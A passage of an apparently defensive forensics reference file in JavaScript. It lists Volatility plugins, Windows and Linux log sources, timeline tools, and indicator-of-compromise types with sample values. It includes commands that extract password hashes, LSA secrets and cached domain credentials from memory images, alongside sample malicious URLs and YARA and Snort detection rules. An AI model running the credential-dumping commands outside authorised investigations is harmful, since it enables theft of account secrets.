  { plugin: "printkey", description: "Print registry key values", usage: "vol.py -f <image> windows.registry.printkey --key 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'", significance: "Examine specific registry keys for persistence, configuration" },
  { plugin: "hivedump", description: "Dump entire registry hive from memory", usage: "vol.py -f <image> windows.registry.hivedump --dump-dir <dir>", significance: "Extract complete registry hive for offline analysis" },
  { plugin: "userassist_vol", description: "Parse UserAssist registry entries", usage: "vol.py -f <image> windows.registry.userassist", significance: "Program execution evidence with run count and timestamps" },
  { plugin: "shimcachemem", description: "Parse Application Compatibility Cache from memory", usage: "vol.py -f <image> windows.registry.shimcachemem", significance: "Evidence of program execution or presence" },
  { plugin: "shellbags_vol", description: "Parse Shellbags from registry hives in memory", usage: "vol.py -f <image> windows.registry.shellbags", significance: "Folder access history including network and removable media" },
  { plugin: "getservicesids", description: "List service SIDs from registry", usage: "vol.py -f <image> windows.registry.getservicesids", significance: "Service account security identifiers" },
  { plugin: "certificates", description: "Extract certificates from registry", usage: "vol.py -f <image> windows.registry.certificates", significance: "Installed certificates, potential rogue CA certificates" },

  // Malware analysis
  { plugin: "malfind", description: "Find injected code and hidden DLLs in process memory", usage: "vol.py -f <image> windows.malfind", significance: "Code injection detection: RWX memory with PE headers or shellcode" },
  { plugin: "yarascan", description: "Scan memory for YARA rule matches", usage: "vol.py -f <image> yarascan.YaraScan --yara-file <rules.yar>", significance: "Signature-based detection of malware patterns in memory" },
  { plugin: "ssdt", description: "Display System Service Descriptor Table hooks", usage: "vol.py -f <image> windows.ssdt", significance: "Kernel-level rootkit detection via SSDT hooking" },
  { plugin: "idt", description: "Display Interrupt Descriptor Table", usage: "vol.py -f <image> windows.idt", significance: "IDT hooking by rootkits for interrupt interception" },
  { plugin: "callbacks", description: "List kernel notification callbacks", usage: "vol.py -f <image> windows.callbacks", significance: "Rootkit callback registrations for process/thread/image events" },
  { plugin: "driverirp", description: "Display IRP handler functions for drivers", usage: "vol.py -f <image> windows.driverirp", significance: "IRP hooking by rootkits to intercept I/O requests" },
  { plugin: "driverscan", description: "Scan for driver objects in memory", usage: "vol.py -f <image> windows.driverscan", significance: "Find loaded kernel drivers including hidden rootkit drivers" },
  { plugin: "modscan", description: "Scan for kernel modules (drivers) in physical memory", usage: "vol.py -f <image> windows.modscan", significance: "Find unloaded or hidden kernel modules" },
  { plugin: "modules", description: "List loaded kernel modules from module list", usage: "vol.py -f <image> windows.modules", significance: "Currently loaded kernel modules and drivers" },
  { plugin: "apihooks", description: "Detect API hooks in process and kernel memory", usage: "vol.py -f <image> windows.apihooks", significance: "Inline hooks, IAT hooks, EAT hooks used by malware" },
  { plugin: "svcscan", description: "Scan for Windows service records", usage: "vol.py -f <image> windows.svcscan", significance: "Windows services including stopped/deleted ones, malicious services" },

  // File and data extraction
  { plugin: "filescan", description: "Scan for FILE_OBJECT structures in memory", usage: "vol.py -f <image> windows.filescan", significance: "Find open files, memory-mapped files, and deleted file references" },
  { plugin: "dumpfiles", description: "Dump cached files from memory", usage: "vol.py -f <image> windows.dumpfiles --pid <pid> --dump-dir <dir>", significance: "Extract files from process memory (documents, executables)" },
  { plugin: "mftparser", description: "Parse MFT entries from memory", usage: "vol.py -f <image> windows.mftparser", significance: "NTFS file metadata from memory, includes deleted entries" },
  { plugin: "hashdump", description: "Dump password hashes from SAM registry hive", usage: "vol.py -f <image> windows.hashdump", significance: "Extract local user password hashes (NTLM)" },
  { plugin: "lsadump", description: "Dump LSA secrets from memory", usage: "vol.py -f <image> windows.lsadump", significance: "Service account credentials, VPN passwords, cached secrets" },
  { plugin: "cachedump", description: "Dump domain cached credentials", usage: "vol.py -f <image> windows.cachedump", significance: "Cached domain logon credentials (DCC2 hashes)" },
  { plugin: "clipboard", description: "Extract clipboard contents from memory", usage: "vol.py -f <image> windows.clipboard", significance: "Clipboard data including passwords, commands, copied text" },
  { plugin: "cmdscan", description: "Scan for command history buffers", usage: "vol.py -f <image> windows.cmdscan", significance: "Command prompt history from csrss.exe buffers" },
  { plugin: "screenshot", description: "Extract GDI screenshots from memory", usage: "vol.py -f <image> windows.screenshot --dump-dir <dir>", significance: "Visual representation of user desktop at time of capture" },
  { plugin: "timeliner", description: "Create timeline of events from memory artifacts", usage: "vol.py -f <image> timeliner.Timeliner", significance: "Unified timeline combining process, registry, network events" },

  // Linux memory analysis
  { plugin: "linux_pslist", description: "List running processes on Linux from task_struct", usage: "vol.py -f <image> linux.pslist", significance: "Active Linux processes at time of memory capture" },
  { plugin: "linux_pstree", description: "Display Linux process tree", usage: "vol.py -f <image> linux.pstree", significance: "Linux process hierarchy and parent-child relationships" },
  { plugin: "linux_bash", description: "Recover bash command history from memory", usage: "vol.py -f <image> linux.bash", significance: "Bash command history even if .bash_history was cleared" },
  { plugin: "linux_ifconfig", description: "Display network interface configuration", usage: "vol.py -f <image> linux.ifconfig", significance: "Network interfaces, IP addresses, promiscuous mode" },
  { plugin: "linux_netstat", description: "Display network connections on Linux", usage: "vol.py -f <image> linux.netstat", significance: "Linux network connections and listening sockets" },
  { plugin: "linux_lsmod", description: "List loaded kernel modules on Linux", usage: "vol.py -f <image> linux.lsmod", significance: "Loaded Linux kernel modules including rootkit modules" },
  { plugin: "linux_check_syscall", description: "Check for syscall table hooks on Linux", usage: "vol.py -f <image> linux.check_syscall", significance: "Linux rootkit detection via syscall table modification" },
  { plugin: "linux_malfind", description: "Find injected code in Linux process memory", usage: "vol.py -f <image> linux.malfind", significance: "Code injection detection on Linux systems" },
  { plugin: "linux_mount", description: "Display mounted filesystems from memory", usage: "vol.py -f <image> linux.mount", significance: "Mounted filesystems including hidden or suspicious mounts" },
  { plugin: "linux_enumerate_files", description: "List files referenced in memory", usage: "vol.py -f <image> linux.enumerate_files", significance: "Files open or cached in memory on Linux" },
];

// ---------------------------------------------------------------------------
// 4. LOG_SOURCES
// ---------------------------------------------------------------------------

const LOG_SOURCES = [
  // Linux system logs
  { source: "syslog", location: "/var/log/syslog or /var/log/messages", format: "RFC 3164/5424 (text)", keyEvents: ["Service start/stop", "Kernel messages", "Daemon activity", "System errors", "cron job execution"], tool: "grep / journalctl / Splunk" },
  { source: "auth.log", location: "/var/log/auth.log (Debian/Ubuntu)", format: "Syslog format (text)", keyEvents: ["SSH login success/failure", "sudo usage", "su usage", "PAM authentication", "Account lockouts"], tool: "grep / fail2ban / OSSEC" },
  { source: "secure", location: "/var/log/secure (RHEL/CentOS)", format: "Syslog format (text)", keyEvents: ["SSH authentication", "sudo commands", "su access", "PAM events", "sshd key exchange"], tool: "grep / journalctl / Splunk" },
  { source: "kern.log", location: "/var/log/kern.log", format: "Syslog format (text)", keyEvents: ["Kernel panics", "Module loading", "USB device connections", "Filesystem errors", "OOM killer events"], tool: "dmesg / grep / journalctl" },
  { source: "daemon.log", location: "/var/log/daemon.log", format: "Syslog format (text)", keyEvents: ["Daemon start/stop", "Service errors", "Background process activity"], tool: "grep / journalctl" },
  { source: "cron.log", location: "/var/log/cron.log or /var/log/cron", format: "Syslog format (text)", keyEvents: ["Cron job execution", "at job execution", "Job failures", "Unauthorized cron entries"], tool: "grep / journalctl" },
  { source: "mail.log", location: "/var/log/mail.log", format: "Syslog format (text)", keyEvents: ["Email send/receive", "SMTP connections", "Relay attempts", "Spam filtering", "Delivery failures"], tool: "grep / pflogsumm" },
  { source: "audit.log", location: "/var/log/audit/audit.log", format: "Key-value pairs (text)", keyEvents: ["Syscall auditing", "File access (AVC)", "User authentication", "Privilege escalation", "SELinux denials"], tool: "ausearch / aureport / auditd" },
  { source: "systemd_journal", location: "/var/log/journal/ (binary)", format: "Binary journal format", keyEvents: ["All systemd unit events", "Boot sequences", "Service failures", "Timer activations", "Socket connections"], tool: "journalctl / systemd-journal-remote" },
  { source: "faillog", location: "/var/log/faillog", format: "Binary (faillog format)", keyEvents: ["Failed login count per user", "Account lockout triggers"], tool: "faillog command" },
  { source: "lastlog", location: "/var/log/lastlog", format: "Binary (lastlog format)", keyEvents: ["Last login time per user", "Login source IP/terminal"], tool: "lastlog command" },
  { source: "dpkg.log", location: "/var/log/dpkg.log", format: "Timestamped text", keyEvents: ["Package install", "Package removal", "Package upgrade", "Configuration changes"], tool: "grep / dpkg --log" },

  // Windows Event Logs
  { source: "Windows Security Log", location: "Security.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Logon events (4624/4625)", "Account management (4720/4726)", "Privilege use (4672/4673)", "Object access (4663)", "Policy changes (4719)"], tool: "Event Viewer / Get-WinEvent / EvtxECmd / Chainsaw" },
  { source: "Windows System Log", location: "System.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Service install (7045)", "Service state change (7036)", "System time change (4616)", "Windows Update (19/20/21)", "Driver loading (7034)"], tool: "Event Viewer / Get-WinEvent / EvtxECmd" },
  { source: "Windows Application Log", location: "Application.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Application errors (1000)", "Application hang (1002)", "Windows Installer (11707/11724)", "EMET/Exploit Guard events"], tool: "Event Viewer / Get-WinEvent / EvtxECmd" },
  { source: "PowerShell Operational", location: "Microsoft-Windows-PowerShell%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Script block logging (4104)", "Module logging (4103)", "PowerShell remoting (4688)", "Constrained language mode"], tool: "Get-WinEvent / EvtxECmd / DeepBlueCLI" },
  { source: "Sysmon", location: "Microsoft-Windows-Sysmon%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Process creation (1)", "Network connection (3)", "File creation (11)", "Registry modification (13)", "DNS query (22)"], tool: "Get-WinEvent / Sysmon View / ELK with Sysmon" },
  { source: "Windows Defender Operational", location: "Microsoft-Windows-Windows Defender%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Malware detection (1116/1117)", "Real-time protection (5001/5004)", "Definition update (2000)", "Scan events (1001/1002)"], tool: "Get-WinEvent / Get-MpThreatDetection" },
  { source: "TaskScheduler Operational", location: "Microsoft-Windows-TaskScheduler%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Task registered (106)", "Task triggered (107)", "Task completed (102)", "Task updated (140)", "Task deleted (141)"], tool: "Get-WinEvent / EvtxECmd" },
  { source: "WMI Activity", location: "Microsoft-Windows-WMI-Activity%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["WMI provider loading", "WMI query execution", "Event subscription creation", "Permanent event consumer binding"], tool: "Get-WinEvent / EvtxECmd" },
  { source: "RDP Local Session", location: "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["Session logon (21)", "Session logoff (23)", "Session reconnect (25)", "Session disconnect (24)"], tool: "Get-WinEvent / EvtxECmd" },
  { source: "NTLM Operational", location: "Microsoft-Windows-NTLM%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["NTLM authentication events", "Pass-the-hash indicators", "NTLM fallback from Kerberos"], tool: "Get-WinEvent / EvtxECmd" },
  { source: "Bits-Client", location: "Microsoft-Windows-Bits-Client%4Operational.evtx", format: "EVTX (XML-based binary)", keyEvents: ["BITS job creation (3)", "BITS transfer complete (4)", "Job cancelled (5)", "Job error (60)"], tool: "Get-WinEvent / EvtxECmd" },

  // Web server logs
  { source: "Apache access.log", location: "/var/log/apache2/access.log or /var/log/httpd/access_log", format: "Combined Log Format (text)", keyEvents: ["HTTP requests", "Status codes", "Client IPs", "User agents", "Referrers"], tool: "GoAccess / AWStats / grep / Splunk" },
  { source: "Apache error.log", location: "/var/log/apache2/error.log", format: "Apache error format (text)", keyEvents: ["Server errors", "PHP errors", "Module warnings", "Authentication failures", "File not found"], tool: "grep / tail / Splunk" },
  { source: "Nginx access.log", location: "/var/log/nginx/access.log", format: "Combined or custom format (text)", keyEvents: ["HTTP requests", "Response times", "Upstream responses", "Client IPs", "Request URIs"], tool: "GoAccess / goaccess / grep / ELK" },
  { source: "Nginx error.log", location: "/var/log/nginx/error.log", format: "Nginx error format (text)", keyEvents: ["Connection errors", "Upstream failures", "SSL/TLS errors", "Permission denied", "Rate limiting"], tool: "grep / tail / ELK" },
  { source: "IIS Logs", location: "C:\\inetpub\\logs\\LogFiles\\", format: "W3C Extended Log Format (text)", keyEvents: ["HTTP requests", "Status codes", "Client IPs", "Query strings", "Authentication status"], tool: "Log Parser / Microsoft Log Parser Studio" },

  // Firewall and network logs
  { source: "iptables log", location: "/var/log/kern.log or /var/log/messages (with LOG target)", format: "Syslog with iptables prefix", keyEvents: ["Blocked connections", "Allowed connections", "Port scans", "Spoofed packets", "Rate limit hits"], tool: "grep / iptables -L -v / ulogd" },
  { source: "pf log (BSD/macOS)", location: "/var/log/pflog", format: "pcap binary format", keyEvents: ["Blocked packets", "Passed packets", "State table entries", "NAT translations"], tool: "tcpdump -r / pflog" },
  { source: "Windows Firewall", location: "C:\\Windows\\System32\\LogFiles\\Firewall\\pfirewall.log", format: "W3C format (text)", keyEvents: ["Allowed connections", "Dropped packets", "Source/destination IPs", "Port information"], tool: "Log Parser / Get-Content / Splunk" },
  { source: "Palo Alto Traffic", location: "Syslog or Panorama", format: "CSV or CEF syslog", keyEvents: ["Traffic sessions", "Threat detections", "URL filtering", "File blocking", "WildFire verdicts"], tool: "Panorama / Splunk / Cortex XSOAR" },
  { source: "Cisco ASA Syslog", location: "Syslog server", format: "Cisco syslog format", keyEvents: ["Connection events (%ASA-6-302013/302015)", "Deny events (%ASA-4-106023)", "VPN events", "Failover events"], tool: "Splunk / ASDM / Cisco SecureX" },

  // DNS logs
  { source: "BIND query log", location: "/var/log/named/query.log or /var/log/syslog", format: "BIND log format (text)", keyEvents: ["DNS queries", "Query types", "Response codes", "Client IPs", "Recursive queries"], tool: "grep / dnstop / Splunk" },
  { source: "Windows DNS Debug", location: "C:\\Windows\\System32\\dns\\dns.log or DNS Analytical log", format: "DNS debug format or EVTX", keyEvents: ["DNS queries", "Zone transfers", "Dynamic updates", "Cache poisoning attempts"], tool: "DNS Manager / Get-WinEvent / Splunk" },
  { source: "Unbound log", location: "/var/log/unbound.log", format: "Syslog format (text)", keyEvents: ["DNS queries", "DNSSEC validation", "Cache hits/misses", "Query response times"], tool: "grep / unbound-control stats" },
  { source: "Pi-hole query log", location: "/var/log/pihole.log or /etc/pihole/pihole-FTL.db", format: "dnsmasq log format or SQLite", keyEvents: ["Allowed queries", "Blocked queries", "Query types", "Upstream responses"], tool: "pihole -t / sqlite3 / pihole admin" },

  // DHCP logs
  { source: "ISC DHCP log", location: "/var/log/syslog (dhcpd entries)", format: "Syslog format (text)", keyEvents: ["DHCPDISCOVER", "DHCPOFFER", "DHCPREQUEST", "DHCPACK", "Lease assignments"], tool: "grep / journalctl / Splunk" },
  { source: "Windows DHCP Server", location: "C:\\Windows\\System32\\dhcp\\DhcpSrvLog-*.log", format: "CSV format (text)", keyEvents: ["IP assignment (Event ID 10)", "IP release (Event ID 12)", "Lease renewal (Event ID 11)", "NACK (Event ID 13)"], tool: "DHCP MMC / Log Parser / Splunk" },

  // IDS/IPS logs
  { source: "Snort alerts", location: "/var/log/snort/alert or /var/log/snort/snort.log", format: "Text or unified2 binary", keyEvents: ["Signature matches", "Priority levels", "Source/destination", "Payload data", "Classification"], tool: "Snort / Barnyard2 / Sguil / Splunk" },
  { source: "Suricata eve.json", location: "/var/log/suricata/eve.json", format: "JSON (EVE format)", keyEvents: ["Alert events", "DNS events", "HTTP events", "TLS events", "Flow events"], tool: "jq / Kibana / Splunk / Scirius" },
  { source: "Zeek (Bro) logs", location: "/opt/zeek/logs/current/", format: "TSV or JSON", keyEvents: ["conn.log (connections)", "dns.log (DNS queries)", "http.log (HTTP requests)", "ssl.log (TLS sessions)", "files.log (file transfers)"], tool: "zeek-cut / jq / RITA / Splunk / ELK" },
  { source: "OSSEC alerts", location: "/var/ossec/logs/alerts/alerts.log", format: "JSON or text", keyEvents: ["File integrity changes", "Rootkit detection", "Log analysis alerts", "Active response actions"], tool: "Kibana / OSSEC Web UI / Splunk" },

  // Cloud and application logs
  { source: "AWS CloudTrail", location: "S3 bucket or CloudWatch", format: "JSON", keyEvents: ["API calls", "Console logins", "IAM changes", "S3 access", "Security group modifications"], tool: "AWS Console / Athena / Splunk / ElasticSearch" },
  { source: "Azure Activity Log", location: "Azure Monitor / Storage Account", format: "JSON", keyEvents: ["Resource operations", "Administrative actions", "Service health", "Alerts", "Autoscale actions"], tool: "Azure Portal / Log Analytics / Splunk" },
  { source: "GCP Cloud Audit Logs", location: "Cloud Logging", format: "JSON", keyEvents: ["Admin activity", "Data access", "System events", "Policy denied"], tool: "Cloud Console / BigQuery / Splunk" },
  { source: "Kubernetes audit log", location: "/var/log/kubernetes/audit/audit.log", format: "JSON", keyEvents: ["API server requests", "Authentication events", "Authorization decisions", "Resource modifications"], tool: "kubectl / Falco / Splunk / ELK" },
  { source: "Docker daemon log", location: "/var/log/docker.log or journalctl -u docker", format: "JSON or text", keyEvents: ["Container start/stop", "Image pull", "Network creation", "Volume operations", "Health check failures"], tool: "docker logs / journalctl / Splunk" },
];

// ---------------------------------------------------------------------------
// 5. TIMELINE_TOOLS
// ---------------------------------------------------------------------------

const TIMELINE_TOOLS = [
  { tool: "log2timeline (Plaso)", description: "Super-timeline creation from multiple artifact sources. Parses 100+ artifact types into a unified timeline", command: "log2timeline.py --storage-file timeline.plaso <evidence_source>", outputFormat: "Plaso storage file (convert with psort.py to CSV/JSON/XLSX)" },
  { tool: "psort", description: "Post-processing and output tool for Plaso timelines. Filters and converts Plaso storage to human-readable formats", command: "psort.py -o l2tcsv -w timeline.csv timeline.plaso", outputFormat: "L2T CSV, dynamic CSV, JSON, XLSX, OpenSearch" },
  { tool: "Timesketch", description: "Collaborative forensic timeline analysis platform. Web-based interface for exploring and annotating timelines", command: "timesketch_importer --host <url> --timeline_name <name> timeline.plaso", outputFormat: "Web-based interactive timeline with search, tagging, and sharing" },
  { tool: "mactime (Sleuth Kit)", description: "Create timeline from filesystem metadata body file. Processes TSK body file format", command: "fls -r -m '/' <image> | mactime -b - -d > timeline.csv", outputFormat: "Pipe-delimited text or CSV with MAC timestamps" },
  { tool: "KAPE Timeline", description: "KAPE module for targeted timeline creation from Windows artifacts. Combines multiple parsers", command: "kape.exe --tsource <source> --tdest <dest> --target !SANS_Triage --module !EZParser", outputFormat: "CSV files from individual artifact parsers" },
  { tool: "Autopsy Timeline", description: "Built-in timeline feature in Autopsy digital forensics platform. GUI-based timeline visualization", command: "Autopsy GUI -> Timeline tab (no CLI equivalent)", outputFormat: "Interactive timeline visualization with filtering" },
  { tool: "MFTECmd", description: "Parse NTFS $MFT for file system timeline. Extracts all timestamp information from MFT entries", command: "MFTECmd.exe -f $MFT --csv <output_dir> --csvf mft_timeline.csv", outputFormat: "CSV with SI and FN timestamps, file metadata" },
  { tool: "PECmd", description: "Parse Windows Prefetch files for execution timeline. Extracts run times and counts", command: "PECmd.exe -d C:\\Windows\\Prefetch --csv <output_dir> --csvf prefetch_timeline.csv", outputFormat: "CSV with last 8 execution times, run count, referenced files" },
  { tool: "EvtxECmd", description: "Parse Windows Event Log files for event timeline. Supports maps for enhanced parsing", command: "EvtxECmd.exe -f Security.evtx --csv <output_dir> --csvf evtx_timeline.csv", outputFormat: "CSV with parsed event data, supports custom maps" },
  { tool: "Chainsaw", description: "Rapidly search and hunt through Windows EVTX files using Sigma rules and custom logic", command: "chainsaw hunt <evtx_dir> -s <sigma_rules> --mapping <mappings> --csv --output <output>", outputFormat: "CSV, JSON, or table format with Sigma rule matches" },
  { tool: "Hayabusa", description: "Windows event log fast forensics timeline generator. Uses Sigma-compatible detection rules", command: "hayabusa csv-timeline -d <evtx_dir> -o timeline.csv", outputFormat: "CSV timeline with alert levels, MITRE ATT&CK mappings" },
  { tool: "fls (Sleuth Kit)", description: "List files and directories in a filesystem image including deleted entries", command: "fls -r -p -m '/' <image> > bodyfile.txt", outputFormat: "TSK body file format (input for mactime)" },
  { tool: "Velociraptor Timeline", description: "Endpoint artifact collection with timeline generation via VQL queries", command: "velociraptor artifacts collect --args ... Windows.Timeline.MFT", outputFormat: "JSON, CSV via VQL notebook queries" },
  { tool: "Cyber Triage", description: "Automated endpoint forensics with integrated timeline creation", command: "Cyber Triage GUI or CLI collection agent", outputFormat: "Interactive timeline in Cyber Triage UI, CSV/JSON export" },
  { tool: "TimelineExplorer", description: "Eric Zimmerman's tool for exploring CSV timeline data with filtering and column highlighting", command: "TimelineExplorer.exe (GUI -- open CSV files from other tools)", outputFormat: "Interactive table view with filtering, coloring, and export" },
  { tool: "jq timeline processing", description: "Command-line JSON processor for building custom timelines from JSON log sources", command: "cat eve.json | jq -r '[.timestamp, .event_type, .src_ip, .dest_ip] | @csv' > timeline.csv", outputFormat: "Custom CSV or JSON output format" },
];

// ---------------------------------------------------------------------------
// 6. IOC_TYPES
// ---------------------------------------------------------------------------

const IOC_TYPES = [
  {
    type: "ipv4_address",
    description: "IPv4 network address associated with malicious activity",
    examples: ["192.168.1.100 (internal lateral movement)", "203.0.113.50 (external C2 server)", "10.0.0.1 (internal pivot point)"],
    tools: ["VirusTotal", "AbuseIPDB", "Shodan", "GreyNoise", "IPVoid", "OTX AlienVault"],
    falsePositives: ["CDN IP addresses (Cloudflare, Akamai)", "Shared hosting IPs serving multiple sites", "Dynamic IP addresses reassigned to legitimate users", "VPN exit nodes used by many users"],
  },
  {
    type: "ipv6_address",
    description: "IPv6 network address associated with malicious activity",
    examples: ["2001:db8::1 (documentation example)", "fe80::1 (link-local reconnaissance)", "::ffff:192.0.2.1 (IPv4-mapped)"],
    tools: ["VirusTotal", "Shodan", "Hurricane Electric BGP Toolkit", "IPinfo.io"],
    falsePositives: ["Privacy extensions generating temporary addresses", "Tunnel broker addresses", "Link-local addresses in internal scans"],
  },
  {
    type: "domain",
    description: "Fully qualified domain name used for C2, phishing, or malware distribution",
    examples: ["malicious-update.example.com", "login-secure-verify.com", "cdn-static-content.xyz"],
    tools: ["VirusTotal", "URLScan.io", "PassiveTotal/RiskIQ", "DomainTools", "WHOIS", "SecurityTrails"],
    falsePositives: ["Newly registered legitimate domains", "Dynamic DNS services (duckdns.org, no-ip.com)", "URL shortener domains", "Parked domains with rotating content"],
  },
  {
    type: "url",
    description: "Complete URL associated with malicious activity (phishing page, malware download, C2 endpoint)",
    examples: ["https://evil.com/update.exe", "http://192.168.1.1/shell.php", "https://legitimate.com/redirect?url=malicious.com"],
    tools: ["URLScan.io", "VirusTotal", "Google Safe Browsing", "PhishTank", "Hybrid Analysis"],
    falsePositives: ["Legitimate URLs with suspicious query parameters", "URL shorteners redirecting to safe content", "Archived/cached versions of cleaned sites", "Testing/staging URLs"],
  },
  {
    type: "file_hash_md5",
    description: "MD5 hash of a malicious file (128-bit, 32 hex characters)",
    examples: ["d41d8cd98f00b204e9800998ecf8427e", "5d41402abc4b2a76b9719d911017c592"],
    tools: ["VirusTotal", "Hybrid Analysis", "MalwareBazaar", "NSRL", "HashLookup (CIRCL)"],
    falsePositives: ["MD5 collisions (theoretically possible)", "Packed/crypted variants with same functionality", "Clean files with same hash in NSRL database"],
  },
  {
    type: "file_hash_sha1",
    description: "SHA-1 hash of a malicious file (160-bit, 40 hex characters)",
    examples: ["da39a3ee5e6b4b0d3255bfef95601890afd80709", "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"],
    tools: ["VirusTotal", "Hybrid Analysis", "MalwareBazaar", "TotalHash"],
    falsePositives: ["SHA-1 collision attacks (demonstrated)", "Same false positives as MD5 plus collision risk"],
  },
  {
    type: "file_hash_sha256",
    description: "SHA-256 hash of a malicious file (256-bit, 64 hex characters). Preferred hash for IOCs",
    examples: ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"],
    tools: ["VirusTotal", "Hybrid Analysis", "MalwareBazaar", "YARA", "ClamAV"],
    falsePositives: ["Extremely rare -- SHA-256 collisions are computationally infeasible", "File hash matching a known-good file in software repository"],
  },
  {
    type: "email_address",
    description: "Email address used in phishing campaigns, as sender, or associated with threat actor",
    examples: ["attacker@malicious-domain.com", "ceo-urgent@legitimate-lookalike.com", "noreply@phishing-update.net"],
    tools: ["Have I Been Pwned", "EmailRep.io", "Hunter.io", "WHOIS", "email header analysis"],
    falsePositives: ["Spoofed sender addresses", "Compromised legitimate email accounts", "Shared/generic email addresses", "Automated system notification addresses"],
  },
  {
    type: "mutex",
    description: "Mutual exclusion object name used by malware to prevent multiple instances",
    examples: ["Global\\MicrosoftUpdateCheck", "UNIQUE_MUTEX_FOR_TROJAN", "session0_mutex_default"],
    tools: ["Process Explorer", "Handle.exe", "Volatility handles plugin", "Sandbox reports"],
    falsePositives: ["Common mutex names used by legitimate software", "Generic names that overlap with system components", "Mutex names generated from system properties"],
  },
  {
    type: "registry_key",
    description: "Windows registry key or value created or modified by malware",
    examples: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateService", "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousDriver", "HKCU\\Software\\Classes\\CLSID\\{malicious-guid}"],
    tools: ["Registry Explorer", "RegRipper", "Autoruns", "Volatility printkey", "RECmd"],
    falsePositives: ["Legitimate software using similar registry paths", "Group Policy-created entries", "Windows Update entries", "OEM/manufacturer entries"],
  },
  {
    type: "file_path",
    description: "File system path where malware is stored or drops payloads",
    examples: ["C:\\Users\\Public\\Documents\\update.exe", "/tmp/.hidden_backdoor", "C:\\Windows\\Temp\\svchost.exe"],
    tools: ["File system analysis", "KAPE", "Autoruns", "EDR file monitoring"],
    falsePositives: ["Legitimate files in common staging directories", "Temporary files from software installations", "System files with legitimate names in correct locations"],
  },
  {
    type: "user_agent",
    description: "HTTP User-Agent string associated with malware communication or scanning tools",
    examples: ["Mozilla/5.0 (compatible; MSIE 6.0; Bot)", "python-requests/2.25.1", "curl/7.68.0", "Go-http-client/1.1"],
    tools: ["Web proxy logs", "WAF logs", "Zeek http.log", "Wireshark HTTP dissector"],
    falsePositives: ["Common user agents used by many tools (curl, wget, Python requests)", "Spoofed user agents mimicking legitimate browsers", "Outdated but legitimate browser user agents"],
  },
  {
    type: "ssl_certificate_hash",
    description: "SHA-1 or SHA-256 hash of SSL/TLS certificate used by malicious infrastructure",
    examples: ["JA3: a0e9f5d64349fb13191bc781f81f42e1", "Certificate SHA-256: e3b0c44298fc1c..."],
    tools: ["Censys", "Shodan", "crt.sh", "JA3/JA3S database", "SSL certificate transparency logs"],
    falsePositives: ["Self-signed certificates on internal systems", "Wildcard certificates covering many domains", "Shared certificates on hosting platforms"],
  },
  {
    type: "ja3_fingerprint",
    description: "MD5 hash of TLS client hello parameters for client fingerprinting",
    examples: ["a0e9f5d64349fb13191bc781f81f42e1 (Cobalt Strike)", "72a589da586844d7f0818ce684948eea (Metasploit)"],
    tools: ["Zeek JA3 module", "Wireshark JA3 plugin", "Suricata JA3", "JA3er.com"],
    falsePositives: ["Common JA3 hashes shared by legitimate applications", "TLS library updates changing fingerprints", "CDN/proxy modifying TLS parameters"],
  },
  {
    type: "yara_rule",
    description: "YARA signature matching malware patterns in files or memory",
    examples: ["rule Emotet_Loader { strings: $mz = { 4D 5A } condition: $mz at 0 }", "rule Cobalt_Strike_Beacon { ... }"],
    tools: ["YARA", "yara-python", "Volatility yarascan", "ClamAV", "THOR"],
    falsePositives: ["Overly broad rules matching legitimate PE files", "Rules matching packer signatures used by legitimate software", "String-based rules matching common code patterns"],
  },
  {
    type: "snort_signature",
    description: "Snort/Suricata IDS rule matching malicious network traffic patterns",
    examples: ["alert tcp any any -> any 443 (msg:'Malware C2'; content:'|deadbeef|'; sid:1000001;)"],
    tools: ["Snort", "Suricata", "Security Onion", "SELKS"],
    falsePositives: ["Rules matching common protocol patterns", "Encrypted traffic matching byte patterns by coincidence", "High-volume rules generating alert fatigue"],
  },
  {
    type: "cidr_range",
    description: "CIDR notation IP range associated with malicious infrastructure or botnet",
    examples: ["198.51.100.0/24 (C2 hosting range)", "203.0.113.0/28 (scanning source block)"],
    tools: ["BGP looking glass", "WHOIS", "Shodan", "GreyNoise", "Team Cymru IP-to-ASN"],
    falsePositives: ["Large CIDR blocks containing legitimate hosts", "Cloud provider ranges used by many customers", "ISP ranges with dynamic allocation"],
  },
  {
    type: "asn",
    description: "Autonomous System Number associated with malicious network infrastructure",
    examples: ["AS12345 (Bulletproof hosting provider)", "AS174 (Transit provider used by attacker)"],
    tools: ["BGPView", "Hurricane Electric BGP Toolkit", "Team Cymru", "RIPE Stat", "PeeringDB"],
    falsePositives: ["Large ASNs containing both legitimate and malicious hosts", "Transit ASNs carrying traffic from many sources", "Cloud provider ASNs"],
  },
  {
    type: "bitcoin_address",
    description: "Bitcoin wallet address used for ransomware payments or cryptocurrency theft",
    examples: ["1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"],
    tools: ["Blockchain.com Explorer", "Chainalysis", "CipherTrace", "Wallet Explorer", "OXT.me"],
    falsePositives: ["Reused addresses from legitimate services", "Mixing service output addresses", "Exchange deposit addresses"],
  },
  {
    type: "process_name",
    description: "Process name associated with malware execution",
    examples: ["svchost.exe (in wrong directory)", "csrss.exe (running as user)", "powershell.exe -enc <base64>"],
    tools: ["Process Explorer", "Process Monitor", "EDR", "Volatility pslist", "Sysmon Event ID 1"],
    falsePositives: ["Legitimate Windows processes (svchost, csrss, lsass)", "Common admin tools (PsExec, PowerShell)", "Process name spoofing"],
  },
  {
    type: "service_name",
    description: "Windows service name created by malware for persistence",
    examples: ["WindowsUpdateService", "SecurityHealthCheck", "SystemDefender64"],
